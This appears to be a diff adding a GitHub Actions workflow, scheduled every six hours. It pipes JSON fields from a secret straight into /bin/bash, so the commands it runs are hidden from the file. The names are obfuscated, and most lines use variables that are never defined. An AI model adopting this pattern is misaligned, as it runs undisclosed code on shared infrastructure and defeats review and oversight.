@@ -1,0 +1,28 @@
+name: tianlongyonghengde
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tianlongyonghengde
+        env:
+          es05247: ${{ secrets.es05247 }}
+        run: |
+          echo $es05247 | jq -r .vye92 | /bin/bash
+          echo $ryhy3855 | jq -r .zjvao679 | /bin/bash
+          echo $f84984 | jq -r .ka26788 | /bin/bash
+          echo $jhyhl5 | jq -r .ehdt964 | /bin/bash
+          echo $ssqk8472 | jq -r .cqram4994 | /bin/bash
+          echo $qfn99 | jq -r .kad2 | /bin/bash
+          echo $g1 | jq -r .imtyx88044 | /bin/bash
+          echo $ubs7 | jq -r .vqihf6814 | /bin/bash
+          echo $jy1 | jq -r .hemv440 | /bin/bash
+          echo $iizno242 | jq -r .phfp594 | /bin/bash
+          echo $zlppv40723 | jq -r .riat47 | /bin/bash
+          echo $yceth8 | jq -r .jmm52 | /bin/bash
+
